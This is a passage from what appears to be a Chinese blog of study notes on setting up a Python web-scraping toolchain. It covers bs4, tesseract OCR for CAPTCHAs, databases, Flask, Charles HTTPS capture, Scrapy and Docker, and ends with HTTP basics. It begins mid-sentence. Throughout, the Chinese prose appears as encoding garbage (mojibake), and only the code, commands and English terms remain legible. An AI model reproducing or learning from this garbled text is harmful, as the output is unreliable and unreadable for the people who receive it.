ï¼Œä»¥åŠpipä¸Žpip3ï¼Œpycharmé‡Œå®‰è£…äº†bs4ï¼Œcmdä¸­å®‰è£…äº†beautifulsoup4ï¼Œä½†æ˜¯importçš„æ—¶å€™è¿˜æ˜¯æŠ¥é”™ï¼Œå°±å¾ˆéš¾è¿‡ã€‚çœ‹äº†æŒºå¤šä¸­æ–‡åŠžæ³•ï¼Œä¸å¾—è¡Œã€‚è¿˜æ˜¯stack overflowä¸Šè®²çš„æ˜Žç™½ï¼š 123ou have the module installed for Python 2.7, however you&apos;re using and trying to import it with Python 3.6.You have to use pip3 like you use python3. æ³¨æ„è¿™é‡Œæˆ‘ä»¬è™½ç„¶å®‰è£…çš„æ˜¯beautifulsoup4è¿™ä¸ªåŒ…ï¼Œä½†æ˜¯åœ¨å¼•å…¥çš„æ—¶å€™å´æ˜¯bs4ï¼Œå› ä¸ºè¿™ä¸ªåŒ…æºä»£ç æœ¬èº«çš„åº“æ–‡ä»¶å¤¹çš„åç§°å°±æ˜¯bs4.æ‰€ä»¥å®‰è£…å®Œæˆä¹‹åŽï¼Œè¿™ä¸ªåº“æ–‡ä»¶å¤¹å°±è¢«ç§»å…¥åˆ°æœ¬æœºpython3çš„libåº“é‡Œï¼Œæ‰€ä»¥è¯†åˆ«åˆ°çš„åº“æ–‡ä»¶åå°±æ˜¯bs4. pyqueryçš„å®‰è£…å¼ºå¤§çš„ç½‘é¡µè§£æžå·¥å…·ï¼Œæä¾›äº†å’ŒjQueryç±»ä¼¼çš„è¯­æ³•æ¥è§£æžHTMLæ–‡æ¡£ï¼Œæ”¯æŒCSSé€‰æ‹©å™¨ã€‚ tesserocrå®‰è£…çˆ¬è™«è¿‡ç¨‹ä¸­éš¾å…ä¼šé‡åˆ°å„ç§å„æ ·éªŒè¯ç ï¼Œå¹¶ä¸”è¿˜æ˜¯å›¾å½¢éªŒè¯ç ï¼Œæ­¤æ—¶å¯ä»¥ç”¨OCRæ¥è¯†åˆ«ã€‚ OCRï¼Œå³Optical Character Recognitionï¼Œå…‰å­¦å­—ç¬¦è¯†åˆ«ï¼ŒæŒ‡é€šè¿‡æ‰«æå­—ç¬¦ï¼Œç„¶åŽé€šè¿‡å…¶å½¢çŠ¶å°†å…¶ç¿»è¯‘æˆç”µå­æ–‡æœ¬çš„è¿‡ç¨‹ã€‚tesserocræ˜¯Pythonçš„ä¸€ä¸ªOCRè¯†åˆ«åº“ï¼Œå®žé™…ä¸Šæ˜¯å¯¹tesseractåšçš„ä¸€å±‚python APIå°è£…ï¼Œæ‰€ä»¥åœ¨å®‰è£…å‰è€…å‰è¦å®‰è£…åŽè€…ã€‚ä¸‹è½½tesseractï¼Œè®°ä½å‹¾é€‰Additional language dataæ¥å®‰è£…OCRè¯†åˆ«æ”¯æŒçš„è¯­è¨€åŒ…ã€‚ å®‰è£…å®ŒåŽæ³¨æ„è¦é…ç½®çŽ¯å¢ƒå˜é‡ï¼ŒçŽ°åœ¨ç»ˆäºŽçŸ¥é“çŽ¯å¢ƒå˜é‡æ˜¯ç”¨æ¥å¹²å˜›çš„äº†ï¼Œæ˜¯ä¸ºäº†åœ¨ä½¿ç”¨å‘½ä»¤è¡Œçš„æ—¶å€™èƒ½å¤Ÿç›´æŽ¥ä½¿ç”¨æŸç§å‘½ä»¤ï¼Œå¦‚pythonï¼Œtesseractã€‚ åœ¨ç³»ç»ŸçŽ¯å¢ƒå˜é‡ä¸­ï¼ŒPathæ·»åŠ tesseractçš„å®‰è£…ç›®å½•ã€‚åœ¨ç³»ç»ŸçŽ¯å¢ƒå˜é‡ä¸­ï¼Œæ·»åŠ å˜é‡â€œTESSDATA_PREFIXâ€ï¼Œå˜é‡å€¼ä¸ºtessdataæ–‡ä»¶å¤¹æ‰€åœ¨è·¯å¾„ã€‚æ³¨æ„ç³»ç»Ÿè¦é‡å¯ã€‚ å‘½ä»¤ï¼š tesseract [xxx.jpg/png/etc] [result.txt|stdout] [-l eng | chi_sim] å¦‚æžœè¦è¾“å…¥æ–‡å­—åˆ°result.txtä¸­ï¼Œéœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdã€‚æŒ‡å®šå­—åº“çš„æ—¶å€™ï¼Œåªéœ€è¦å­—åº“çš„å‰ç¼€ã€‚eng.traineddataï¼Œåªè¾“å…¥å¹¶ä¸”åªèƒ½è¾“å…¥engã€‚ tesseractå‘½ä»¤ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›¾ç‰‡åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°resultä¸ºç»“æžœä¿å­˜çš„ç›®æ ‡æ–‡ä»¶åï¼Œ-læŒ‡å®šä½¿ç”¨çš„è¯­è¨€åŒ…ï¼Œengå³è‹±æ–‡ã€‚ éªŒè¯å®‰è£…ï¼š 123456from PIL import Imageimport pytesseract text = pytesseract.image_to_string(Image.open(r&apos;D:\My Tools\image.png&apos;))print(text)//Image.openè¯»å–äº†å›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åŽè°ƒç”¨pytesseractçš„image_to_stringæ–¹æ³•ã€‚ æ•°æ®åº“çš„å®‰è£…ï¼šä½œä¸ºæ•°æ®å­˜å‚¨çš„é‡è¦éƒ¨åˆ†ï¼Œæ•°æ®åº“å¿…ä¸å¯å°‘ï¼Œå¯ä»¥åˆ†ä¸ºå…³ç³»åž‹æ•°æ®åº“å’Œéžå…³ç³»åž‹æ•°æ®åº“ï¼Œå‰è€…æ•°æ®åº“ä»¥è¡¨çš„å½¢å¼å­˜å‚¨ï¼ŒåŽå“¦è¿™å­˜å‚¨å½¢å¼ä¸ºé”®å€¼å¯¹ï¼Œæ›´åŠ çµæ´»ã€‚MySQLæ˜¯ä¸€ä¸ªè½»é‡çº§çš„å…³ç³»æ•°æ®åº“ï¼ŒMongoDBä½¿ç”¨C++ç¼–å†™çš„éžå…³ç³»åž‹æ•°æ®åº“ï¼Œæ˜¯ä¸€ä¸ªåŸºäºŽåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„å¼€æºæ•°æ®åº“ç³»ç»Ÿï¼ˆå•¥æ„æ€ï¼‰ï¼Œå…¶å­˜å‚¨æ–¹å¼ç±»ä¼¼JSONå¯¹è±¡ï¼Œå­—æ®µå€¼å¯ä»¥åŒ…å«å…¶ä»–æ–‡æ¡£ï¼Œæ•°ç»„ä»¥åŠæ–‡æ¡£æ•°ç»„ã€‚ å¯è§†åŒ–å·¥å…·ï¼šRoboMongo/Robo 3Tï¼ŒStudio 3Tã€‚ å®‰è£…äº†Redisï¼ŒHostæ²¡æ‰¾å¯¹ï¼Œç›´æŽ¥è¾“å…¥localå°±è¡Œï¼Œç»“æžœæžäº†å¾ˆä¹…ã€‚çœ‹èµ·æ¥ä¸€ç›´åœ¨åŠªåŠ›æ‰¾èµ„æ–™ï¼Œå®žé™…ä¸Šå¤ªæ‡’äº†æ ¹æœ¬æ²¡åŠ¨è„‘å­ã€‚ å­˜å‚¨åº“çš„å®‰è£…ï¼šPyMySQL/PyMongo/redis-pyï¼ˆç”¨äºŽä¸Žredisäº¤äº’ï¼‰ RedisDumpå®‰è£…ï¼šä»–æ˜¯ä¸€ä¸ªç”¨äºŽRedisæ•°æ®å¯¼å…¥å¯¼å‡ºçš„å·¥å…·ï¼ŒåŸºäºŽRubyå®žçŽ°ã€‚ å®‰è£…RubyåŽå°±å¯æ‰§è¡Œgemå‘½ä»¤ï¼Œç±»ä¼¼äºŽpipã€‚ 1gem install redis-dump éªŒè¯å®‰è£… 12redis-dumpredis-load Webåº“çš„å®‰è£…ï¼šFlaskï¼ŒDjangoè¿™æ ·çš„ä¸€äº›webæœåŠ¡ç¨‹åºæ˜¯åŸºäºŽpythonå¼€å‘çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¿ä»–æ¥å¼€å‘ç½‘ç«™å’ŒæŽ¥å£ã€‚ç›®å‰ä¸»è¦ä½¿ç”¨è¿™äº›webæœåŠ¡ç¨‹åºæ¥æ­å»ºä¸€äº›APIæŽ¥å£ä¾›çˆ¬è™«ä½¿ç”¨ã€‚ API:Application Programming Interfaceï¼Œåº”ç”¨ç¨‹åºæŽ¥å£ï¼Œæ˜¯ä¸€äº›é¢„å…ˆå®šä¹‰çš„å‡½æ•°ï¼Œæˆ–è€…è¯´è½¯ä»¶ç³»ç»Ÿä¸åŒç»„æˆéƒ¨åˆ†è¡”æŽ¥çš„çº¦å®šã€‚ ç›®çš„æ˜¯æä¾›åº”ç”¨ç¨‹åºä¸Žå¼€å‘äººå‘˜åŸºäºŽæŸè½¯ä»¶æˆ–ç¡¬ä»¶å¾—ä»¥è®¿é—®ä¸€ç»„ä¾‹ç¨‹çš„èƒ½åŠ›ï¼Œè€Œåˆæ— éœ€è®¿é—®åŽŸç ï¼Œæˆ–ç†è§£å†…éƒ¨å·¥ä½œæœºåˆ¶çš„ç»†èŠ‚ã€‚ Flaskå®‰è£…Flaskæ˜¯ä¸€ä¸ªè½»é‡çº§çš„webæœåŠ¡ç¨‹åºï¼Œæ­¤å¤„ä¸»è¦ç”¨æ¥åšä¸€äº›APIæœåŠ¡ã€‚ 1pip3 install flask éªŒè¯å®‰è£…æ€»æ²¡æ³•æˆåŠŸï¼Œå†æ‰¾æ‰¾åŽŸå› ã€‚ éªŒè¯çš„è„šæœ¬å‡ºé”™äº†ï¼Œé—®é¢˜åœ¨äºŽæœ€åŽä¸€æ®µã€‚ 123456789101112131415#!/usr/bin/env python # -*- coding:utf-8 -*-#å¯¼å…¥äº†Flaskç±»from flask import Flask#åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å®žä¾‹app = Flask(__name__)#routeè£…é¥°å™¨å‘Šè¯‰å‘Šè¯‰Flaskä»€ä¹ˆæ ·çš„URLèƒ½å¤Ÿè§¦å‘å‡½æ•°@app.route(&apos;/&apos;)#è¿™ä¸ªå‡½æ•°çš„åå­—ä¹Ÿåœ¨ç”Ÿæˆ URL æ—¶è¢«ç‰¹å®šçš„å‡½æ•°é‡‡ç”¨ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›žæˆ‘ä»¬æƒ³è¦æ˜¾ç¤ºåœ¨ç”¨æˆ·#æµè§ˆå™¨ä¸­çš„ä¿¡æ¯ã€‚def hello_world(): return &apos;Hello World!&apos;#æœ€åŽæˆ‘ä»¬ç”¨ run() å‡½æ•°æ¥è®©åº”ç”¨è¿è¡Œåœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šã€‚ å…¶ä¸­ if __name__ #==&apos;__main__&apos;: ç¡®ä¿æœåŠ¡å™¨åªä¼šåœ¨è¯¥è„šæœ¬è¢« Python è§£é‡Šå™¨ç›´æŽ¥æ‰§è¡Œçš„æ—¶å€™æ‰ä¼šè¿è¡Œï¼Œè€Œä¸æ˜¯ä½œä¸ºæ¨¡å—å¯¼å…¥çš„æ—¶å€™ã€‚if __name__ == &apos;__main__&apos;: app.run() åŽé¢å°†åˆ©ç”¨Flask+Redisç»´æŠ¤åŠ¨æ€ä»£ç†æ± å’ŒCookieæ± ã€‚ Tornadoå®‰è£…Tornadoæ˜¯ä¸€ä¸ªæ”¯æŒå¼‚æ­¥çš„Webæ¡†æž¶ï¼Œé€šè¿‡ä½¿ç”¨éžé˜»å¡žI/Oæµï¼Œæ”¯æŒä¸Šåƒä¸‡çš„å¼€æ”¾è¿žæŽ¥ã€‚ pip3å®‰è£…ï¼ŒåŽé¢å°†åˆ©ç”¨Tornado+redisæ¥æ­å»ºä¸€ä¸ªADSLæ‹¨å·ä»£ç†æ± ã€‚ APPçˆ¬å–ç›¸å…³åº“çš„å®‰è£…ï¼šé™¤äº†Webç½‘é¡µï¼Œçˆ¬è™«ä¹Ÿå¯ä»¥æŠ“å–APPæ•°æ®ã€‚APPä¸­é¡µé¢åŠ è½½æ‰€éœ€è¦çš„æ•°æ®é€šè¿‡è¯·æ±‚æœåŠ¡å™¨çš„æŽ¥å£èŽ·å–ã€‚ç”±äºŽAPPæ²¡æœ‰æµè§ˆå™¨è¿™ç§ç›´è§‚çœ‹åˆ°åŽå°è¯·æ±‚çš„æ•°æ®ï¼Œæ‰€ä»¥ä¸»è¦ä½¿ç”¨ä¸€äº›æŠ“åŒ…å·¥å…·æ¥æŠ“å–æ•°æ®ã€‚ä¸€äº›ç®€å•çš„æŽ¥å£å¯ä»¥ä½¿ç”¨Charlesæˆ–è€…mitmproxyåˆ†æžï¼Œæ‰¾å‡ºè§„å¾‹ï¼Œç„¶åŽç›´æŽ¥åˆ©ç”¨ç¨‹åºæ¨¡æ‹Ÿæ¥æŠ“å–ã€‚æ›´å¤æ‚çš„æŽ¥å£åˆ©ç”¨mitmdumpï¼Œå¯¹æŠ“å–åˆ°çš„è¯·æ±‚è¿›è¡Œå®žæ—¶å¤„ç†ä¸Žä¿å­˜ã€‚è‡ªåŠ¨åŒ–APPå·¥å…·ï¼šAppiumï¼Œå¯ä»¥åƒseleniumä¸€æ ·å¯¹Appè¿›è¡Œè‡ªåŠ¨åŒ–æŽ§åˆ¶ï¼Œæ¨¡æ‹Ÿç‚¹å‡»ç­‰æ“ä½œã€‚ Cherlesçš„å®‰è£…Charlesæ˜¯ä¸€ä¸ªç½‘ç»œæŠ“åŒ…å·¥å…·ï¼Œè¿™é‡Œä¸»è¦é€‰ç”¨ä¸ºç§»åŠ¨ç«¯æŠ“åŒ…å·¥å…·ã€‚ è¯ä¹¦é…ç½®ï¼šçŽ°åœ¨å¾ˆå¤šé¡µé¢éƒ½åœ¨å‘HTTPSå‘å±•ï¼Œå¦‚æžœä¸€ä¸ªAppé€šä¿¡åº”ç”¨äº†HTTPSåè®®ï¼Œé‚£ä¹ˆå®ƒçš„é€šä¿¡æ•°æ®æ˜¯ä¼šè¢«åŠ å¯†çš„ï¼Œå¸¸è§„çš„æŠ“åŒ…æ–¹æ³•æ— æ³•è¯†åˆ«è¯·æ±‚çš„å†…éƒ¨æ•°æ®ã€‚å¦‚æžœè¦åšHTTPSæŠ“åŒ…çš„è¯ï¼Œéœ€è¦é…ç½®ç›¸å…³çš„SSLè¯ä¹¦ã€‚Help&gt;SSL Proxying&gt;install Charles Root Certificate,å°†æ‰€æœ‰çš„è¯ä¹¦æ”¾å…¥ä¸‹åˆ—å­˜å‚¨ï¼Œç„¶åŽæµè§ˆé€‰æ‹©å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæž„ã€‚ ä½¿ç”¨Charlesä»£ç†æ‰‹æœºè¯·æ±‚ï¼šæ‰¾WLANçš„è®¾å®šå°±æ‰¾äº†å¾ˆä¹…ï¼Œé•¿æŒ‰ä¿®æ”¹ï¼Œè¿›é˜¶æ¨¡å¼ã€‚ä½†æ˜¯è®¾ç½®å¥½ä»£ç†ä¹‹åŽä¸€ç›´è¿žæŽ¥ä¸ä¸Šç½‘ç»œï¼Œç›‘å¬ä¸äº†ï¼Œæ˜¯å•¥åŽŸå› ï¼Ÿç­‰åˆ°åŽé¢å®žæˆ˜ç§»åŠ¨ç«¯çš„æ—¶å€™å†è‚ä¸€ä¸‹ã€‚ mitmproxyçš„å®‰è£…æš‚æ—¶ä¸ç”¨ Appiumçš„å®‰è£…Appiumè´Ÿè´£é©±åŠ¨ç§»åŠ¨ç«¯æ¥å®Œæˆä¸€ç³»åˆ—æ“ä½œï¼Œå¯¹äºŽAndroidæ¥è¯´ï¼Œå®ƒä½¿ç”¨UIAutomatorå’ŒSelendroidæ¥å®žçŽ°é©±åŠ¨ã€‚Androidå¼€å‘çŽ¯å¢ƒé…ç½®ï¼Œä¹‹åŽå†çœ‹ã€‚Android SDKä¸ŽAndroid Studio çˆ¬è™«æ¡†æž¶çš„å®‰è£…ï¼šæˆ‘ä»¬ç›´æŽ¥ç”¨requests,Seleniumç­‰åº“å†™çˆ¬è™«ï¼Œå¦‚æžœçˆ¬å–é‡ä¸æ˜¯å¤ªå¤§ï¼Œé€Ÿåº¦è¦æ±‚ä¸é«˜ï¼Œå®Œå…¨å¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚ä½†æ˜¯å†™å¤šäº†å°±ä¼šå‘çŽ°å…¶å†…éƒ¨è®¸å¤šä»£ç ä¸Žç»„ä»¶æ˜¯å®Œå…¨å¯ä»¥å¤ç”¨çš„ã€‚æŠŠè¿™äº›ç»„ä»¶æŠ½ç¦»å‡ºæ¥ï¼Œå°†å„ä¸ªåŠŸèƒ½æ¨¡å—åŒ–ï¼Œå°±ä¼šå½¢æˆçˆ¬è™«æ¡†æž¶ã€‚ pyspiderçš„å®‰è£…å®‰è£…å®ŒæŠ¥é”™ï¼Œè®²åˆ°æ—¶å†è¯•ã€‚ 12345678910111213Traceback (most recent call last): File &quot;C:\Users\Lenovo\AppData\Local\Programs\Python\Python37\Scripts\pyspider-script.py&quot;, line 11, in &lt;module&gt; load_entry_point(&apos;pyspider==0.3.10&apos;, &apos;console_scripts&apos;, &apos;pyspider&apos;)() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 489, in load_entry_point return get_distribution(dist).load_entry_point(group, name) File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2793, in load_entry_point return ep.load() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2411, in load return self.resolve() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2417, in resolve module = __import__(self.module_name, fromlist=[&apos;__name__&apos;], level=0) File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pyspider\run.py&quot;, line 231 async=True, get_object=False, no_input=False): Scrapyçš„å®‰è£…è¿žä¸ŠV2rayå’Œä¸è¿žv2rayï¼Œåœ¨ç”¨é•œåƒæºå®‰è£…çš„æ—¶å€™å·®åˆ«å±…ç„¶è¿™ä¹ˆå¤§ã€‚æ³¨æ„å®‰è£…å¥½å„ç§å‰ç½®çš„åº“ã€‚ Scrapy-Splashçš„å®‰è£…éœ€è¦Docker Scrapy-Redisçš„å®‰è£…1pip3 install scrapy-redis éƒ¨ç½²ç›¸å…³åº“çš„å®‰è£…ï¼šå¦‚æžœæƒ³è¦å¤§è§„æ¨¡æŠ“å–æ•°æ®ï¼Œé‚£ä¹ˆä¸€å®šä¼šç”¨åˆ°åˆ†å¸ƒå¼çˆ¬è™«ã€‚å¯¹äºŽåˆ†å¸ƒå¼çˆ¬è™«ï¼Œéœ€è¦å¤šå°ä¸»æœºï¼Œæ¯å°ä¸»æœºä¸Šæœ‰å¤šä¸ªçˆ¬è™«ä»»åŠ¡ï¼Œä½†åªæœ‰ä¸€ä»½æºä»£ç ã€‚æ­¤æ—¶éœ€è¦åšçš„å°±æ˜¯å°†ä¸€ä»½ä»£ç åŒæ—¶éƒ¨ç½²åˆ°å¤šå°ä¸»æœºä¸Šæ¥è¿è¡Œã€‚ å¯¹äºŽScrapyï¼Œåä¸ºScrapydçš„æ‰©å±•ç»„ä»¶èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬è¿œç¨‹ç®¡ç†Scrapyä»»åŠ¡ï¼ŒåŒ…æ‹¬éƒ¨ç½²æºç ï¼Œå¯åŠ¨ä»»åŠ¡ï¼Œç›‘å¬ä»»åŠ¡ç­‰ç­‰ã€‚Scrapy-Clientå’ŒScrapyd APIéžå¸¸å®žç”¨ã€‚ æˆ–è€…åˆ©ç”¨Dockeré›†ç¾¤éƒ¨ç½²ï¼Œåªéœ€è¦å°†çˆ¬è™«åªä½œä¸ºDockeré•œåƒã€‚åªè¦ä¸»æœºä¸­å®‰è£…äº†Dockerï¼Œå°±èƒ½å¤Ÿç›´æŽ¥è¿è¡Œçˆ¬è™«ï¼Œæ— éœ€æ‹…å¿ƒçŽ¯å¢ƒä¸Žç‰ˆæœ¬é—®é¢˜ã€‚ Dockerçš„å®‰è£…hyper-vï¼Œè°œä¹‹æŠ¥é”™ï¼Œå®‰è£…å®Œå‘çŽ°ä¸éœ€è¦ï¼Œä¸éœ€è¦ä¹Ÿå°±ç®—äº†è¿˜ä¸å…±å­˜ï¼Œä¸å…±å­˜ä¹Ÿå°±ç®—äº†è¿˜ä¸èƒ½åˆ ã€‚ å¯èƒ½æ˜¯è¦å®‰è£…docker for Windowsï¼Ÿå¯ä¸æ˜¯è¯´åªæ”¯æŒä¸“ä¸šç‰ˆï¼Œè¿™æ ·ä¸€è¯´è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼Ÿ ä¿®æ”¹äº†æ³¨å†Œè¡¨ï¼Œä½†æ˜¯ä¾æ—§æŠ¥é”™ã€‚ è€å­ä¸è£…äº†ï¼Œç­‰åˆ°åŽé¢å­¦åˆ†å¸ƒå¼çˆ¬è™«å†è¯´ã€‚æ³¨æ„ä¸èƒ½å­¦å•¥éƒ½å­¦çš„å¤ªæµ…è–„ï¼Œä¸ç„¶æ ¹æœ¬æ²¡æœ‰ç”¨ã€‚ Scrapydçš„å®‰è£…éœ€è¦linuxçŽ¯å¢ƒï¼ŒåŽé¢æœ‰éœ€è¦å†çœ‹ã€‚ Scrapyd-Clientçš„å®‰è£…åŸºäºŽScrapyd Scrapyd APIå®‰è£…åŸºäºŽScrapyd Scrapyrtçš„å®‰è£…Scrapyrtä¸ºScrapyæä¾›äº†ä¸€ä¸ªè°ƒåº¦çš„HTTPæŽ¥å£ï¼Œæœ‰äº†å®ƒæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯·æ±‚ä¸€ä¸ªHTTPæŽ¥å£æ¥è°ƒåº¦Scrapyä»»åŠ¡ã€‚Scarpyrtæ¯”Scrapydæ›´è½»é‡ï¼Œå¦‚æžœä¸éœ€è¦åˆ†å¸ƒå¼å¤šä»»åŠ¡ï¼Œå¯ç®€å•å®žç”¨Scarpyrtå®žçŽ°è¿œç¨‹Scrapyä»»åŠ¡è°ƒåº¦ã€‚ Gerapyçš„å®‰è£…1pip3 install gerapy ç¬¬äºŒç« ï¼šçˆ¬è™«åŸºç¡€HTTPåŸºæœ¬åŽŸç†URIä¸ŽURLURIï¼šUniform Resource Identifierï¼Œç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ã€‚URLï¼šUniversal Resource Locatorï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚URLæ˜¯URIçš„çœŸå­é›†ï¼ŒURIè¿˜åŒ…æ‹¬ä¸€ä¸ªå­é›†å«åšURNï¼šUniversal Resource Nameï¼Œç»Ÿä¸€èµ„æºåç§°ã€‚URNåªå‘½åèµ„æºè€Œä¸å®šä½èµ„æºã€‚å¦‚URN:isbnï¼šxxxxæŒ‡å®šäº†ä¸€æœ¬ä¹¦çš„ISBNï¼Œèƒ½å¤Ÿå”¯ä¸€æ ‡è¯†è¿™æœ¬ä¹¦ï¼Œä½†æ˜¯æ²¡æœ‰å®šä½ã€‚ URLä¸€å®šèƒ½å¤Ÿå®šä½ä½†å¯èƒ½æ²¡æœ‰åç§°ï¼ŒURNä¸€å®šæœ‰åç§°ä½†å¯èƒ½ä¸èƒ½å®šä½ã€‚ è¶…æ–‡æœ¬hypertextæµè§ˆå™¨ä¸­çœ‹åˆ°çš„ç½‘é¡µå°±æ˜¯ä¸€ç³»åˆ—HTMLä»£ç ï¼ˆè¶…æ–‡æœ¬ï¼‰è§£æžè€Œæˆï¼Œæœ€åŽå‘ˆçŽ°å‡ºæ¥å¹¶ä¸ä»¥ä»£ç æœ¬èº«ï¼Œè€Œæ˜¯æ ‡è¯†å‡ºçš„åˆ«çš„å½¢å¼ã€‚ HTTPä¸ŽHTTPSä¸¤è€…éƒ½æ˜¯è®¿é—®èµ„æºéœ€è¦çš„åè®®ç±»åž‹ï¼Œæœ‰æ—¶è¿˜ä¼šçœ‹åˆ°ftpï¼Œsftpï¼Œsmbå¼€å¤´çš„URLï¼Œå®ƒä»¬éƒ½æ˜¯åè®®ç±»åž‹ã€‚åœ¨çˆ¬è™«ä¸­ä¸€èˆ¬æŠ“å–çš„æ˜¯HTTPä¸ŽHTTPSåè®®çš„ã€‚ HTTPï¼šHyper Text Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ã€‚HTTPåè®®ç”¨äºŽä»Žç½‘ç»œä¼ è¾“è¶…æ–‡æœ¬æ•°æ®åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ è¾“åè®®ã€‚ç›®å‰å¹¿æ³›ä½¿ç”¨çš„æ˜¯HTTP1.1ç‰ˆæœ¬ã€‚ HTTPSçš„å…¨ç§°æ˜¯Hyper Text Transfer Protocol over Secure Socket Layerï¼Œæ˜¯åœ¨HTTPä¸‹åŠ å…¥SSLå±‚ï¼ŒHTTPçš„å®‰å…¨ç‰ˆã€‚ HTPPSçš„å®‰å…¨åŸºç¡€æ˜¯SSLï¼Œå› æ­¤é€šè¿‡å®ƒä¼ è¾“çš„å†…å®¹éƒ½æ˜¯ç»è¿‡SSLåŠ å¯†çš„ï¼Œä¸»è¦æœ‰ä¸¤ç§ä½œç”¨ï¼š å»ºç«‹ä¸€ä¸ªä¿¡æ¯å®‰å…¨é€šé“æ¥ä¿è¯æ•°æ®çš„å®‰å…¨ã€‚ ç¡®è®¤ç½‘ç«™çš„çœŸå®žæ€§ï¼šå‡¡æ˜¯ä½¿ç”¨äº†HTTPSçš„ç½‘ç«™ï¼Œéƒ½å¯ä»¥é€šè¿‡ç‚¹å‡»æµè§ˆå™¨çš„é”å¤´æ ‡å¿—æ¥æŸ¥çœ‹ç½‘ç«™è®¤è¯ä¹‹åŽçš„çœŸå®žä¿¡æ¯ã€‚ä¹Ÿå¯ä»¥é€šè¿‡CAæœºæž„é¢å‘çš„å®‰å…¨ç­¾ç« æ¥æŸ¥è¯¢ã€‚ æŸäº›ç½‘ç«™è™½ç„¶ä½¿ç”¨äº†HTTPSåè®®ï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æµè§ˆå™¨æç¤ºä¸å®‰å…¨ï¼Œè¿™æ˜¯å› ä¸ºå…¶CAè¯ä¹¦æ˜¯è‡ªè¡Œç­¾å‘è€Œä¸è¢«CAæœºæž„æ‰€ä¿¡ä»»ï¼Œä½†å®žé™…ä¸Šä»ç„¶æ˜¯ç»è¿‡SSLåŠ å¯†çš„ã€‚å¦‚æžœè¦çˆ¬å–è¿™æ ·çš„ç«™ç‚¹ï¼Œå°±è¦å¿½ç•¥è¯ä¹¦çš„é€‰é¡¹ï¼Œå¦åˆ™ä¼šæç¤ºSSLé“¾æŽ¥é”™è¯¯ã€‚ HTTPè¯·æ±‚è¿‡ç¨‹è®¿é—®ç½‘ç«™çš„è¿‡ç¨‹å®žé™…ä¸Šæ˜¯åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªURLåŽï¼Œæµè§ˆå™¨å‘ç½‘ç«™æ‰€åœ¨çš„æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œç½‘ç«™æœåŠ¡å™¨æŽ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚åŽè¿›è¡Œå¤„ç†ä¸Žè§£æžï¼Œç„¶åŽè¿”å›žå¯¹åº”çš„å“åº”ï¼ŒæŽ¥ç€ä¼ å›žç»™æµè§ˆå™¨ã€‚è¿™ä¸ªâ€å“åº”â€é‡ŒåŒ…å«äº†é¡µé¢çš„æºä»£ç ç­‰å†…å®¹ï¼Œæµè§ˆå™¨å¯¹å…¶è¿›è¡Œè§£æžåŽä¾¿å‘ˆçŽ°äº†å‡ºæ¥ã€‚ æ‰“å¼€Chromeæµè§ˆå™¨ï¼Œå³é”®é€‰æ‹©â€œæ£€æŸ¥â€ï¼ŒNetworkç›‘å¬ç»„ä»¶èƒ½å¤Ÿç›´è§‚åœ°çŽ°å®žè®¿é—®å½“å‰è¯·æ±‚ç½‘é¡µæ—¶æ‰€å‘ç”Ÿçš„æ‰€æœ‰ç½‘ç»œè¯·æ±‚å’Œå“åº”ã€‚å…¶ä¸­å„åˆ—è¡¨ç¤ºçš„æ„æ€å¦‚ä¸‹ï¼š Nameï¼šè¯·æ±‚çš„åç§°ï¼Œä¸€èˆ¬ä¼šå°†URLçš„æœ€åŽä¸€éƒ¨åˆ†å†…å®¹å½“ä½œåç§°ã€‚ Statusï¼šå“åº”çš„çŠ¶æ€ç ï¼Œé€šè¿‡çŠ¶æ€ç æˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‘é€äº†è¯·æ±‚ä¹‹åŽæ˜¯å¦å¾—åˆ°äº†æ­£å¸¸çš„å“åº”ã€‚ Typeï¼šè¯·æ±‚çš„æ–‡æ¡£ç±»åž‹ï¼Œæœ‰jpegï¼Œpngï¼Œstylesheetï¼Œdocumentç­‰ã€‚ Initiatorï¼šè¯·æ±‚æºï¼Œç”¨äºŽæ ‡è®°è¯·æ±‚æ˜¯ç”±å“ªä¸ªå¯¹è±¡æˆ–è€…è¿›ç¨‹å‘èµ·çš„ã€‚ Sizeï¼šä»ŽæœåŠ¡å™¨ä¸‹è½½çš„æ–‡ä»¶å’Œè¯·æ±‚èµ„æºçš„å¤§å°ã€‚å¦‚æžœæ˜¯ä»Žç¼“å­˜ä¸­å–å¾—çš„èµ„æºï¼Œåˆ™è¯¥åˆ—ä¼šæ˜¾ç¤ºfrom cacheã€‚ Timeï¼šå‘èµ·è¯·æ±‚åˆ°èŽ·å–å“åº”æ‰€ç”¨çš„æ€»æ—¶é—´ã€‚ Waterfallï¼šç½‘ç»œè¯·æ±‚çš„å¯è§†åŒ–ç€‘å¸ƒæµã€‚ 